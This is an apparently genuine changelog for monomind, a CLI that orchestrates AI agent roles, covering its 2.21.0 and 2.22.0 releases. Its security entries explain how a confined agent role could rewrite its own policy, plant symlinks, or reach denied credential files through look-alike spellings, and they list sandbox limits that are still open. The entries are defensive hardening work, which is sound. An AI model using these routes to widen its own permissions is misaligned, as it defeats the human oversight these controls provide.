- **`monomind cleanup --force` keeps the skill catalog unless `--purge-data` is given** ([#579](https://github.com/monoes/monomind/issues/579)). `.monomind/catalog/` (staged packages, approvals and tool grants) was not among cleanup's data paths, so `--force` alone deleted it. It is now data, like `.monomind/org-skills/`.

- **`org status` no longer reports a killed standalone run as running** ([#573](https://github.com/monoes/monomind/issues/573)). An `org run` killed from outside (SIGKILL, or together with the app that started it) never reaches its stop or crash handlers, so `runtime.json` kept saying `running` with its pid, and a `kill -0` probe kept passing once that pid was reused by another process. `runtime.json` now records the process's start identity (`pidStart`: its kernel start time and boot id on Linux, `ps -o lstart` elsewhere), and every reader checks that the recorded pid is still that process: `org status` (text and `--format json`), `org list`, `org stop`, `org delete`, `org migrate`, `org mark-complete`, `org logs --follow`, the dashboard's runtime view and startup gap-fill, and the statusline. A record written before this change has no start identity and is judged by its pid alone, as before.

  - On the next `org status`, `org run` or `org serve` start, a `running` record whose run is dead is rewritten as `crashed` with `closedBy: "liveness-check"` and the reason (`pid N gone`, or `pid N now belongs to another process`), and a line is appended to the org's `liveness.jsonl`. `org status` shows it as `crashed (pid N gone)`. The #274 cross-checks still apply first, so a run whose pid is stale but whose serve heartbeat or event log shows it alive is left alone. The run's checkpoint is kept, so `org run --resume` still works.

  - `org run` now refuses to start an org whose recorded run is still alive in another process ("already running (pid N)"), instead of starting a second process on the same `runtime.json`.

- **monodesign URL detection retries a Chrome launch that times out waiting for its CDP port** ([#583](https://github.com/monoes/monomind/issues/583)). On a cold Windows CI runner, Chrome's first launch could take longer than the 30s launch timeout to write `DevToolsActivePort`, so the first browser test failed while every later launch in the same job passed. The monobrowse detection driver now retries a CDP-port timeout once. The timed-out Chrome has already been killed by monobrowse, its profile dir is deleted, and the retry uses a new one, since a leftover Chrome process could still hold the old dir's lock. Other launch failures (no Chrome, Chrome exiting at startup, a port held by another process) are not retried. A failed launch no longer leaves its `monodesign-cdp-*` profile dir behind.

- **Marking a dead run crashed can no longer overwrite a run that just started** ([#586](https://github.com/monoes/monomind/issues/586)). The #573 check re-read `runtime.json` and then renamed a `crashed` record over it, so a new run that wrote its record in between lost it until its next state write. The check now moves the record aside, writes `crashed` only if it is still the dead run's record, and puts it back with an exclusive link, so a record a new run writes at any point in that sequence is kept. The running process's own writes are never blocked or delayed.

### Added

- **`monomind org sign --check` and `--project <dir>`** ([#558](https://github.com/monoes/monomind/issues/558)). Tools that rewrite org files themselves, such as mono-agent, re-sign only their own writes: they verify the org before writing and sign with `--yes` only if it verified. They had to scrape the review text for that. `org sign <org> --check` (or `--check --all`) only reports each org's state and never prompts, signs or writes anything (it skips the startup update check and subsystem init too, and does not record the plant watch's first look). It prints one line per org (`release: signed`), or with `--format json` `{"orgs":[{"org","state","signedAt","message"}]}`, where `state` is `signed`, `changed`, `unsigned`, `invalid-signature`, `forbidden-key`, `not-found` or `invalid`. It exits 0 when every org checked is signed and unchanged, 1 otherwise, and 2 for an org that is not there, `--all` with no orgs, or a usage error. Being read-only, it also runs inside a role. `--project <dir>` (with or without `--check`) uses that directory's real path as the project root instead of the current directory; it must hold `.monomind/orgs`. Signing through `--project` binds the same path as signing from inside the directory, and the refusal inside a role or `agent exec` process tree still applies.

- **`monomind org sign --expect-hash <hex>`, and a `hash` in `org sign --check --format json`** ([#558](https://github.com/monoes/monomind/issues/558)). A tool that checks an org, writes it and then runs `org sign <org> --yes` left a window: a role could edit the org JSON or an `instructions_file` in between, and the edit was signed. With `--expect-hash`, monomind reads the org file and each instructions file once, computes the hash it is about to sign from those bytes, and signs them only if it equals the one given. Otherwise it exits 1, names the expected and actual hashes, and writes nothing to the operator directory. It works with `--yes` and `--project`. With `--all`, pass `--expect-hash <org>=<hex>` once for every org (a missing, repeated or unknown org is a usage error, exit 2), and if one org does not match, none is signed. `--check --format json` now reports each signable org's current `hash`, computed from the same read as its state. The hash (the signed projection, its canonical JSON, the instructions digests and SHA-256) is documented in [`org sign`](doc/commands/org.md#the-signable-hash) so a tool in another language can compute it from the bytes it wrote, and a fixed-fixture test pins it.

  - `org sign <org> --format json` without `--yes` prints the review as JSON (`{"org","state","hash","review","reviewText"}`). `hash` is the hash of exactly the content reviewed, from the same single read that `--expect-hash` uses. `review` holds the structured fields: authority lines, unconfined roles, non-bundled skills, approval candidates, first-look configs and the diff since the last signature. `reviewText` is the text review. It never prompts or signs and exits 0. Signing afterwards with `--yes --expect-hash <hash>` refuses if a role changed the files after the review, so a signature is always of what the user saw.

  - The documented key order of the canonical JSON now matches what monomind has always produced. Array-index keys (canonical integers from 0 to 4294967294, with no leading zero or sign) come first in numeric order, and the other keys follow in UTF-16 order. The doc gives a Go recipe, and test vectors pin it, including the non-index keys `01` and `4294967295`. Existing signatures are unchanged.

  - `org run`'s one-time sign prompt now signs the instructions files it read for the review, instead of reading them again when it signs.

- **`org sign` declares its features in the `--version --json` handshake, and rejects options it does not know.** An older monomind silently ignored `--expect-hash` and signed with exit 0, so a caller could not tell its guard had not run. `monomind --version --json` now lists `org-sign-check` (`--check` and `--project`, [#561](https://github.com/monoes/monomind/issues/561)), `org-sign-expect-hash` and `org-sign-review-json` in `capabilities` (Agent Exec Protocol rev 29); a caller checks for the one it needs before relying on it. `org sign` now fails closed: any option it does not recognise (for example a misspelled `--expect-hsh`) prints `org sign: unknown option --expect-hsh — nothing signed.` and exits 2 without signing or writing anything. Other commands keep their current flag handling.

### Removed

- **BREAKING CHANGE: `monoswarm` and `autopilot` are removed** ([#418](https://github.com/monoes/monomind/issues/418)). They were deprecated in 2.21.0. Neither started an agent: both recorded state files. Instead, spawn subagents with Claude Code's Task tool, all in one message, or run an agent org with `monomind org run <org>`.

  - **CLI:** the `monoswarm` command (`init`, `start`, `status`, `stop`, `scale`) and the `autopilot` command (`status`, `enable`, `disable`, `config`, `reset`, `log`, `predict`, `check`) are gone. Running either one prints what to use instead, not a typo suggestion.

  - **MCP tools, for MCP clients:** the 13 `monoswarm_*` tools (`monoswarm_init`, `monoswarm_status`, `monoswarm_scale`, `monoswarm_health`, `monoswarm_shutdown`, `monoswarm_agent_add`, `monoswarm_join`, `monoswarm_leave`, `monoswarm_vote`, `monoswarm_notice`, `monoswarm_memory`, `monoswarm_audit_list`, `monoswarm_audit_verify`) and the 8 `autopilot_*` tools (`autopilot_status`, `autopilot_enable`, `autopilot_disable`, `autopilot_config`, `autopilot_reset`, `autopilot_log`, `autopilot_progress`, `autopilot_predict`) no longer exist. A client that calls one gets "tool not found". The `monoswarm` and `autopilot` MCP tool categories are gone, so the full registry now has 198 tools.

  - **`monomind start` and `start stop`** no longer record or terminate a monoswarm state file, and call no MCP tool. `start` checks the project is initialized and prints the topology and max-agents settings from `.monomind/config.yaml`; its `--topology`/`-t` flag, which only set the recorded state, is gone: passing it prints a one-line warning and is otherwise ignored. `start stop` still stops a running daemon.

  - **`monomind status`** reads the agent count from the agent store (`agent_list`) instead of `monoswarm_status`. Its JSON output has `agents: { total }` in place of the `swarm` object, the Swarm panel is gone, and `--health-check` no longer has a "Swarm Status" check.

  - **Generated files:** the full, security and performance CLAUDE.md templates drop `## Monoswarm Orchestration` and `## Monoswarm Configuration & Anti-Drift`. `## Monoswarm Protocols & Routing` becomes `## Agent Spawning & Routing` and `## Monoswarm Execution Rules` becomes `## Agent Execution Rules`, without the monoswarm lines. All four old headings are recognised on upgrade, so an old CLAUDE.md written before the managed block sheds them cleanly. `.monomind/CAPABILITIES.md` drops "Monoswarm Orchestration" and "Monoswarm Vote Strategies" and the `monoswarm` command row. The `monoswarm` area is gone from `guidance_capabilities` / `guidance_recommend`, `guidance_quickref`'s `swarm-ops` domain lists the Task tool and `org run`, and `guidance_workflow` no longer returns a `swarmConfig` or `topology`.

  - **Shipped assets:** the `monoswarm` skill, the `/monoswarm:*` commands, `/coordination:monoswarm-init`, `/coordination:task-orchestrate`, `/mastermind:monoswarm`, `/mastermind:topology`, `/optimization:auto-topology` and the `coordinator-monoswarm-init` agent are removed from every asset tree (`.claude`, the npm package, `.agents`, `.gemini`, `.kimi-code`). The `swarm` pack no longer carries them. Agents and commands that told models to call `monoswarm_*` tools now spawn with the Task tool.

  - **Upgrading a project:** `init --force` and `init upgrade` retire every file an older release installed for these: the `.claude` skill, commands and agent above, their `.agents/skills` and `.gemini/skills` mirrors, their `.kimi-code/{agents,skills,plugin/commands}` copies and their `.opencode/{agent,command,skills}` copies (`.opencode/command/monoswarm-*.md`, `coordination-monoswarm-init.md`, …), including projects set up before the init manifest existed. A file is retired only when its content matches a version some release shipped; it is moved to `.monomind/backups/<run>/retired/files/<path>`, and a directory left empty is removed. A file you edited is kept, and init prints a warning naming it. The READMEs `init` no longer rewrites (`.claude/commands/{coordination,monitoring,workflows}/README.md`), whose old versions named `monomind monoswarm` / `monoswarm_init`, are refreshed to the current copy when unmodified.

  - **Manual steps after upgrading**, only where init warned or you customised things:
    1. Delete or rewrite each file init reported as kept ("… was removed in 2.22.0 … but you edited it"), and any command, skill, agent, hook or script of your own that calls `monomind monoswarm`, `monomind autopilot`, or a `monoswarm_*` / `autopilot_*` MCP tool. Use Claude Code's Task tool or `monomind org run <org>` instead.
    2. Remove the old state if you have it: the `monoswarm/` directory in the monomind data root (`.monomind/monoswarm/`, or `monomind/monoswarm/` inside the repository's git directory) and `.monomind/data/autopilot-state.json` / `autopilot-log.json`. Nothing reads them now.
    3. An MCP client that pinned tool names (an allow-list, a saved prompt) should drop the 21 removed names.
    4. Scripts that parse `monomind status --format json` should read `agents.total` in place of `swarm.*`.

  - **Also removed:** the dashboard's Swarm Status panel and its `monoswarm_status` / `swarmState` fields, the statusline's and the UI's reads of `.monomind/monoswarm/state.json` (nothing writes it any more), the `.monomind/monoswarm/` gitignore check in `doctor`, the `monoswarm` entry in the `system_health` checks, the unused `MonoswarmCheckpointer` set-up at CLI start, and the vote-tally and HMAC audit-log code only monoswarm used. `doc/concepts/monoswarm.md` is now a short removal note.

  - **`MONOMIND_LOG_LEVEL` is no longer listed** in the full CLAUDE.md template's Environment Variables. Its only reader in the CLI source was the monoswarm tools; `bin/cli.js` still honours `MONOMIND_LOG_LEVEL=debug`.

## [2.21.0] — 2026-09-30

### Deprecated

- **`monoswarm` and `autopilot` are deprecated and will be removed in 2.22.0, the minor release after this one** ([#418](https://github.com/monoes/monomind/issues/418)). Both record state and start no agents. Use Claude Code's Task tool or `monomind org run` instead. Nothing is removed in this release:

  - Every `monoswarm` and `autopilot` subcommand prints a one-line deprecation notice on stderr. `-Q` drops it. The notice never goes to stdout, so the subcommands that emit JSON (`--format json` / `--json`) keep it clean.

  - `monomind start` and `monomind start stop` record and terminate a monoswarm state file, so they print the same notice. `start` no longer suggests `monoswarm status`, and its progress lines say it records state and starts no agents. When monoswarm is removed in 2.22.0, `start` stops recording monoswarm state and `start stop` stops marking it terminated.

  - The 13 `monoswarm_*` and 8 `autopilot_*` MCP tools start their descriptions with `DEPRECATED (removed in 2.22.0; use the Task tool or 'monomind org run'):` and carry the full notice in a `deprecated` field on every result. The autopilot tool descriptions no longer claim to re-engage agents or report learning metrics.

  - `monoswarm status` counts `idle` agent records as idle, not active.

  - `monoswarm init --format json` printed its progress lines and table on stdout ahead of the JSON. It now prints only the result document there.

  - Honest wording: `monoswarm scale` reports roster entries recorded or removed (it said "Spawned N agent(s)"), `monoswarm stop` says it marks the state terminated (in its prompt, its output and the bare `monoswarm` help), and `autopilot status` shows `Tasks: 0/0 (n/a)` with no tasks instead of `100%`. `autopilot_status` and `autopilot_progress` return `percent: 0` for zero tasks.

  - The generated CLAUDE.md (full/security/performance templates), `.monomind/CAPABILITIES.md`, the main `--help` examples, the guidance catalog and quick reference, and the shipped monoswarm skill, commands and agents that tell models to initialize a monoswarm now say it is deprecated and point to the Task tool or `org run`. Section headings are unchanged, so upgrades of existing CLAUDE.md files are unaffected.

### Removed

- **`monomind.memory.learningBridge`, `memoryGraph` and `agentScopes` config keys.** `init` wrote them to `.claude/settings.json` and `.monomind/config.yaml` (with `confidenceDecayRate`, `accessBoostAmount`, `consolidationThreshold` and `defaultScope`), `init upgrade` added them, and the wizard asked "Record agent memory scopes (project/local/user) in the config?", but no code, helper or hook read any of them. `init` and `init upgrade` no longer write them, the wizard no longer asks, and `CAPABILITIES.md` drops the "Memory Scopes (ADR-049)" section. Existing configs that carry the keys still load, and `init upgrade` keeps them as they are. `monomind.neural.enabled` is unchanged: the SessionStart hook reads it.

### Changed

- **The Claude Agent SDK and puppeteer's Chrome are no longer installed up front; they install on first use** ([#428](https://github.com/monoes/monomind/issues/428)). `npm install monomind` pulled the ~300 MB native Claude binary through `@anthropic-ai/claude-agent-sdk`, and puppeteer's postinstall downloaded 686 MB of Chrome into `~/.cache/puppeteer`, for everyone. Measured from the packed tarballs on Linux x64, an install is now 263 packages and 938 MB of `node_modules` with nothing outside it, down from 344 packages, 1.23 GB and the Chrome download; four install scripts run instead of five. The SDK is now installed the first time a Claude org role, `agent exec --runtime claude` or `agent models --runtime claude` needs it. `monomind browse` still uses an installed Chrome, Chromium or Edge first; only when there is none does its first launch download Chrome for Testing through `@puppeteer/browsers`, and `design detect` of a URL uses that Chrome too. Both go into `~/.monomind/deps` (`$MONOMIND_HOME/deps`), never into your project, with a notice on stderr. npm runs `npm ci` there, in a staging directory, against lockfiles shipped with the CLI (every tarball must match their integrity hashes, whatever registry is configured), with `--ignore-scripts` and one short fetch attempt, behind a lock, and the result is moved into place only once complete. Org roles cannot write the deps directory, `~/.npmrc` or `~/.config/npm` (file tools, the Claude sandbox, and a read-only bind in the bubblewrap mask), and monomind refuses to load a deps tree containing a symlink on the way in or out, a file owned by another user, or a group- or other-writable file. A copy of the SDK that monomind itself resolves is used only at the pinned version. Chrome is checked by HTTPS only; Chrome for Testing publishes no checksums. `MONOMIND_NO_AUTO_INSTALL=1` turns this off and prints the exact install command instead. `@monoes/monodesign` no longer lists puppeteer (its URL scans use monobrowse, and fall back to a puppeteer you install yourself), and monobrowse gains `setChromeFallback()` and a `MONOBROWSE_CHROME_PATH` fallback that an installed browser always beats. The README and `doc/privacy.md` describe what installs when.

- **`monomind init` installs a small core pack; everything else is an opt-in pack** ([#411](https://github.com/monoes/monomind/issues/411)). Claude Code lists every skill and command with its description in about 1% of the context window (~8,000 chars on a 200k model) and drops descriptions past that. The default init installed 88 skills, 112 commands and 84 agents: ~39,500 chars of skill/command listing and ~13,000 of agent listing, so most descriptions never reached the model. It now installs the core pack: 26 skills (the mastermind engineering workflows, monolean, monodesign, monomotion, stop-slop, verification-quality, hooks, memory, GitHub and browser toolkits), 20 commands (`/mastermind:do`, `review`, `plan`, `execute`, `debug`, `design`, `research`, `help`, …) and 20 agents (the core dev agents plus Security Engineer, Frontend Developer, Software Architect, Technical Writer, Git Workflow Master, DevOps Automator, Monodesign and the GitHub PR/issue/release agents): 6,997 chars of skill/command listing and 3,094 of agent listing. The rest ships in eight opt-in packs: `orgs`, `org-admin`, `swarm`, `github`, `testing`, `specialists` (WeChat, Feishu, Solidity, embedded, SRE, …), `business` and `extras`. Add them with `monomind init --packs orgs,github`, `--all-packs` (or `--full`), the wizard's new pack question, or later with `monomind packs add <pack>`; `monomind packs list` shows each pack and its listing size, and `monomind packs remove <pack>` deletes only the pack's files that still match what init installed. Both keep the Kimi Code and OpenCode trees in step when a project has them. `init --minimal` now installs the 26 core skills (still no commands or agents) instead of 2.20.0's 20-skill set. `init skills` takes `--packs` in place of `--memory`/`--github`. **Existing projects keep everything:** re-running `init` or `init upgrade` deletes nothing, and `init upgrade --add-missing` now adds only files for the packs a project has (a project from before packs counts every pack it has files for).

- **Shipped skill, command and agent descriptions are capped at 200 characters** ([#411](https://github.com/monoes/monomind/issues/411)). `pnpm run lint:skills` fails on a longer one. The 62 over the cap were shortened, among them monodesign (1,080 chars), monolean (606), mastermind-liveness (434) and mastermind-monitor (426), and 15 more core ones were tightened. `node scripts/measure-init-listing.mjs` prints the listing size of a preset.

- **`monomind init` sets up only the coding platforms installed on your machine** ([#420](https://github.com/monoes/monomind/issues/420)). It wrote Claude Code, Antigravity, OpenCode, Kimi Code and Codex into every project. It now checks each one's CLI on `PATH` (`claude`, `gemini`/`agy`/`antigravity`, `opencode`, `kimi`, `codex`; on Windows with `PATHEXT`) and its config directory (`~/.claude` or `$CLAUDE_CONFIG_DIR`; `~/.gemini` or `~/.antigravity`; `~/.config/opencode`, `$XDG_CONFIG_HOME/opencode` or `~/.opencode`; `~/.kimi` or `~/.kimi-code`; `~/.codex` or `$CODEX_HOME`), without running any of them, and writes the ones it finds plus the ones the project already has, so `init --force` still refreshes and re-pins every platform's MCP entry. With none found it writes Claude Code and says so. Init prints what it detected and how to add the rest. On a machine with only Claude Code, a default init in an empty project now writes 162 files (2.4 MB) instead of 437 (5.3 MB), code graph included. `--platforms a,b` names the platforms (`--platform` still works, but not together with `--platforms`); `--all-platforms` and `--target all` write all five, and so does `--full` along with every component and pack. `--all-platforms` with a narrowing flag (`--platforms`, `--target <one>`, `--only-claude`, `--skip-claude`, `--codex`, …) is an error, and `--skip-claude` still means all platforms but Claude Code. The wizard asks which platforms to set up before the component questions, with the detected ones pre-selected (all five for Full). `init --json` reports `platforms: {source, selected, detected}`, and `init skills` copies skills into `.gemini/` and `.agents/` only if the project has them. `init upgrade --add-missing` copies new skills only into the `.gemini/` and `.agents/` trees a project already has, so an upgrade never adds a platform; `init upgrade` does not refresh `.codex/`, `opencode.json`/`.opencode/` or `.kimi-code/` (re-run `init --yes` for that). The post-init doctor pass no longer installs the Claude Code CLI on its own: it asks first, only when Claude Code is selected and missing and someone is at a terminal, and otherwise prints `npm install -g @anthropic-ai/claude-code`; a `claude` in `~/.local/bin` or `~/.claude/local` counts as installed. `init --json` never asks. Init still runs no `npm install` in your project: `package.json` stays byte-identical and no `node_modules` appears. The code graph and the hooks use the `@monoes/monograph` copy bundled with the CLI (or a global install).

- **The Claude runtime uses an installed Claude Code instead of downloading the SDK's copy** ([#522](https://github.com/monoes/monomind/issues/522)). Claude org roles, `agent exec --runtime claude` and `agent models --runtime claude` pass a usable installed `claude` to the SDK as `pathToClaudeCodeExecutable`, and the first-use install then fetches the SDK with `--omit=optional` (about 4 MB, still from the shipped lockfile) instead of 300 MB. monomind looks at `$MONOMIND_CLAUDE_PATH`, then `claude` on `PATH`, `~/.local/bin/claude` and `~/.claude/local/claude`, without running anything to find it. The real path runs, and it must be named `claude` or the native installer's `versions/<x.y.z>` and not be a script, so a shim that resolves to another program (mise) is never run. A binary found on its own is used only if it is a system install (not under `$HOME`, a temp dir or the cwd, and the file and every directory above it owned by root and not group- or other-writable), because org roles run as your user and could otherwise replace a binary the org daemon runs outside the sandbox; running as root, or on Windows, nothing is picked up on its own. Per-user installs (the native installer, mise, nvm, Homebrew) need `MONOMIND_CLAUDE_PATH`, which only has to be owned by you or root and not group- or other-writable (not checked on Windows). When it is not a system install, monomind warns and keeps it read-only for roles: denied to the file tools and in the Claude sandbox, and read-only in the bubblewrap mask with every directory between `$HOME` and it pinned so none can be renamed aside. `claude --version` (once per process, no shell, 5-second timeout) must print `x.y.z (Claude Code)` with 2.x at or above the 2.1.226 the pinned SDK bundles. Anything else falls back to the bundled binary; a refused `MONOMIND_CLAUDE_PATH` is reported on stderr, and `MONOMIND_CLAUDE_PATH=bundled` turns detection off. The SDK's `query` always passes the chosen binary, and fails with a clear message if an update has removed it. `doc/privacy.md` describes the checks.

### Fixed

- **`org sign` and `org approve-paths` no longer list the live `~/.claude/.config.json` as a possible plant before monomind's first look** ([#548](https://github.com/monoes/monomind/issues/548)). With no first-look record for the home directory, the Claude Code global configs are not approval candidates, since the first look trusts every one present. `org sign` prints them on a dim line instead: "will be trusted at monomind's first look: …".

- **Codex home and cost follow-ups from the #537 review** ([#540](https://github.com/monoes/monomind/issues/540)). When `~/.codex` or `$CODEX_HOME` is a symlink (dotfile managers), the codex runner now resolves it and makes the real directory 0700 when the current user owns it, so its logs are no longer world-readable. It tightens each directory through an `O_NOFOLLOW | O_DIRECTORY` file descriptor with `fchmod` instead of `lstat` + `chmod` (the old calls remain the fallback where Node lacks those flags). `org costs` keeps a live $0 role cost as 0 instead of reporting it as unknown, and the `mastermind-budgets` skill marks the org spend as a lower bound when some roles report no cost.

- **npm calls work on Windows again** ([#521](https://github.com/monoes/monomind/issues/521)). Node refuses to spawn `npm.cmd` without a shell (EINVAL since 18.20.2 / 20.12.2), so the first-use installer, MCP auto-install, `security cve` and the update checker and installer failed on Windows. They now run npm's `npm-cli.js` with Node (found through `npm_execpath` or next to `node.exe`), still without a shell.

- **A `fileWrite`/`fileRead` entry that names a directory now grants everything inside it** ([#492](https://github.com/monoes/monomind/issues/492)). Scope entries were always matched as globs, and a glob with no wildcard matches only that exact path, so a role with `fileWrite: ["/srv/growth/site"]` was denied every file inside `site`, while the deny message told it that it "may use /srv/growth/site". An entry with no glob characters (`*`, `?`, `[`, `{`) now means that path and everything beneath it; a relative one resolves against the org workdir. It is compared on real paths, so a sibling with a shared prefix (`site-old`) and a symlink leading out of the directory are still denied, and the credential/guard deny list, the `.git` write check and the decision-file check apply as before. Entries with glob characters match exactly as they did. A directory entry's real path is taken once, when the role starts, so a role cannot widen it by swapping the directory (or a not-yet-existing entry) for a symlink from Bash; an entry that no longer resolves to its startup path refuses the call. An entry that is already a symlink, or is `/`, a drive root, `$HOME` or an ancestor of `$HOME`, grants nothing (write an explicit glob if that is really intended), and an empty-string entry is a config error. Deny messages now label each entry as a directory grant or a glob, and name absolute grants when a path is outside every root. `org validate` (after `{{org_root}}`/`{{home}}` expansion) reports a refused directory entry as an error, and warns when an absolute non-glob entry does not exist or a relative one leaves the role's workdir. Per-call approval results are also reworded: a pending or denied Bash/WebFetch/`org_send` call now says only that one call is waiting for or was refused by a human, that the task queue is not stuck, and what to do meanwhile (continue other work, don't retry the identical call while it is pending, pick another approach after a denial). The `[approval] <action>: APPROVED|DENIED` inbox line keeps its prefix and adds the next step for the pending call(s).

- **`-o json`/`-o sarif`/`--json` output is a clean document on stdout** ([#495](https://github.com/monoes/monomind/issues/495)). `security scan -o sarif` printed its "Security Scan" banner and "Scan complete" line on stdout ahead of the document, so `monomind security scan -o sarif > results.sarif` wrote a file that SARIF uploaders reject; `-o json` had the same problem, and `-Q` changed neither. `security scan`, `security cve --json`, `security defend -o json` and `performance benchmark -o json` now send the banner, progress and summary lines to stderr, and `-Q` drops them. Errors still go to stderr under `-Q`. `security defend` uses `-Q` for `--quick`, so write `--quiet` in full there. User-visible changes beyond JSON output:

  - **Spinner and progress-bar lines now go to stderr in every command**, as `ora` does, so `cmd > file` no longer captures lines such as "Scan complete". This cleans the JSON output of commands that start a spinner before printing it, such as `hooks coverage-gaps --format json` and `hooks worker run --format json`. Under `-Q` the spinner's progress line is dropped, but its completion line is kept.

  - Commands whose only output is their result line still print it on stdout, and `-Q` keeps it: `doc ingest`, `doc import`, `doc export`, `hooks intelligence export --output`, and `browse workflow run`.

  - `security scan -Q` in text mode drops the banner and the "Scan complete" line. It keeps the findings and the summary box.

- **monobrowse: two launches racing for the same default port no longer both fail when both lose the bind** ([#491](https://github.com/monoes/monomind/issues/491)). On Linux, two processes that call `listen()` on the same port at the same instant can both get `EADDRINUSE` (each socket is marked LISTEN before the kernel's conflict check), leaving the port free; about 1 race in 600 locally. Both Chromes then exited early with nothing listening, which `launchBrowser()` read as a Chrome that cannot start, so it failed instead of moving to the next candidate port ("Chrome exited before the CDP endpoint opened on port 23480 (code=21)" in CI). One such early exit per launch is now treated as a lost race and the scan moves on; a Chrome that really cannot start fails the same way on the next port, and the first failure is reported.

- **A claude role's Bash tool uses the role's private TMPDIR** ([#503](https://github.com/monoes/monomind/issues/503), follow-up to [#480](https://github.com/monoes/monomind/issues/480)). Claude Code reads `CLAUDE_CODE_TMPDIR` before `TMPDIR`, and its Bash tool exports that variable to every command it runs. An org started from a Claude Code session's Bash tool inherited the outer session's value, so in the SDK sandbox a claude role's Bash got that shared directory as `$TMPDIR` and a bare `mktemp` landed there: `$HOME/mrg-tmp/claude-1000/claude-1000` in the 2.20.0 release run's drill. Without the sandbox, `$TMPDIR` was right, but a `claude` started from the role's shell still used the shared directory. The role environment now sets `CLAUDE_CODE_TMPDIR` to the role's directory as well as `TMPDIR`, `TMP` and `TEMP`. Claude Code keeps its own files in `claude-<uid>/` inside that directory. The sandbox is unchanged: its writable roots already include the base the role directory sits in. A new opt-in test (`MONOMIND_SANDBOX_E2E=1`) runs the bundled Claude Code CLI against a scripted API, both unsandboxed and in the sandbox, and checks `$TMPDIR`, `mktemp -d` and `$CLAUDE_CODE_TMPDIR`.

- **The pre-bash hook no longer prints git's "not a git repository" error in a project without git** ([#506](https://github.com/monoes/monomind/issues/506)). A `grep`/`find` command reached the monograph lookup, which runs `git rev-parse` to find the repo root with git's stderr passed through, so a project outside a git repository (or across a filesystem boundary) got `fatal: not a git repository …` on the hook's stderr. The helper's git calls in `utils/monograph.cjs` now discard git's stderr; the result was already ignored on failure. `tests/hooks/security-gates.test.mjs` also stops inheriting `MONOMIND_HOOK_QUIET` from a live session (it skipped the code path the fail-open test crashes) and sets `GIT_CEILING_DIRECTORIES`, so it passes the same on tmpfs and disk-backed `TMPDIR`.

- **Security: org roles can no longer rewrite their own org definition, decisions or runtime state with file tools** ([#498](https://github.com/monoes/monomind/issues/498)). The file tools refused only the four decision files (`gates.json`, `approvals.json`, `questions.json`, `inbox.jsonl`). A role whose `fileWrite` reached the org root could Write or Edit `.monomind/orgs/<org>.json`, which holds its own `policy` (scopes, git level, `sandbox.allowWrite`), and have that apply on reload or at the next run. It could also rewrite `decisions.jsonl`. This includes the default `fileWrite: ["**"]` when the workspace is the project root. On the Claude runtime, `Write`, `Edit`, `MultiEdit` and `NotebookEdit` are now refused, regardless of scope, root or `allowWrite`, on these files under the org root's `.monomind/orgs/`:

  - every file directly in it (org definitions and their `-state`, `-secrets`, `-runstate`, … files);

  - every file directly in an org dir (decision files, `runtime.json`, `decisions.jsonl`, `history.jsonl`, `idle-watchdog.json`, and the `run`/`stop`/`pause`/`reload` control files);

  - a run dir's `bus.jsonl` and `sessions.json`;

  - anything under `git-guard/`.
  Every path argument of a call is checked. Paths are classified both as written and after resolving symlinks (dangling ones included), and hard links are compared by inode. On macOS and Windows, segments are compared case-insensitively, and on Windows without trailing dots, spaces or `:stream` suffixes. The `.git` write check now compares the same way. `reports/`, `work/`, `workspace/`, `worktree/`, `.mail/` and `<x>-memory/` stay writable, and so does a checkout's own `.monomind/orgs/`.
  For Bash, and for the native file tools of other CLI runtimes (codex `apply_patch`, kimi, …), which never reach that check:

  - The bubblewrap authority mask binds the orgs dir read-only and binds only the role work dirs back read-write. Each org's `work`, `reports`, `runs`, `scratch`, `workspace` and `.mail`, and any `<dir>` a role's `fileWrite` names, are created first, so `git worktree add … work/src` still works. The org root and `.monomind` can't be renamed. A planted symlink (`ln -s .. orgs/foo`, `ln -s $HOME orgs/foo`) can't loosen the mask or uncover the hidden credentials.

  - The SDK sandbox makes the existing authority files read-only, including every org's whole `git-guard/`. The orgs tree and every dir in an org dir can't be renamed or swapped. Bash there can still create a *new* org definition plus its `run` file, which `org serve` would start, or pre-create an authority file the daemon hasn't written yet. `org-runtime.md` ("Authority files") lists these and the other limits.

- **`monomind start` uses the topology and maxAgents from `.monomind/config.yaml`** ([#509](https://github.com/monoes/monomind/issues/509)). `init` writes that section as `swarm:`, but `start` read `monoswarm:`, so it always fell back to `hierarchical-mesh` and 15 agents. It now reads `swarm:` and still accepts a `monoswarm:` section. The `--topology` flag still takes precedence.

- **The guidance catalog named skills that do not exist.** `guidance_capabilities` and `guidance_recommend` listed `memory-advanced`, `memory-vector-search`, `memory-patterns`, `memory-learning`, `memory-optimization` and five `github-*` skills; none ship. The memory and GitHub areas now point to the shipped `memory-toolkit` and `github-toolkit`; the embeddings area links no skill, since none covers the `embeddings_*` tools. A test fails if the catalog names a skill `monomind init` does not install.

- **Security: org file-tool path checks fold case and Unicode look-alikes; the Bash git check matches `git` in any case** ([#496](https://github.com/monoes/monomind/issues/496)). On a case-insensitive filesystem (macOS, Windows, vfat/exfat, a Linux casefold dir) a role could reach a denied path through another spelling of it. Deny checks now fold every path segment on every platform, whatever the filesystem: NFKC normalization, removal of default-ignorable code points (zero-width space and joiners, soft hyphen, BOM, CGJ, which Linux casefold ignores), and full case folding (so `.SSH`, `.ſsh`, `.ßh`, `.ẞh`, `.gıt`, `.gi<ZWJ>t`, `.ss<soft hyphen>h`, `.conﬁg`, `.proﬁle`, `daſhboard-token` and a Kelvin-sign `K` all match), with trailing dots and spaces and a `:stream` suffix dropped. This covers the credential and guard deny list (`~/.GITCONFIG`, `~/.BashRC`), the dashboard token, the org authority files and the `.git` write check. On a case-sensitive filesystem a deny now also refuses look-alike names, for example a `Dashboard-Token` file anywhere, or anything under `.monomind/Orgs/` of the org root, on Linux. That fail-closed trade-off is intended: the policy cannot always tell whether a directory folds case, and a missed deny is worse than a refused look-alike. Grants (roots and directory entries in `fileWrite`/`fileRead`) compare the on-disk spelling that `realpath` returns and fold only the part of a path that does not exist yet. They do that only on macOS and Windows, and only where a probe of the target directory (a case-swapped lookup of its own name and of one of its entries, by inode and never through a symlink) shows that the filesystem folds case. Globs never fold, and a grant never reaches an existing directory spelled in another case. A directory entry spelled in another case than the directory on disk is no longer refused as a symlink. The Bash git classifier matches `GIT`, `/usr/bin/GIT`, `git.EXE`, `BASH -c "git …"`, `ENV -i …`, `cmd /c`, `powershell`/`pwsh` and other interpreters in any case, so at level `read` `GIT push` is refused like `git push`.

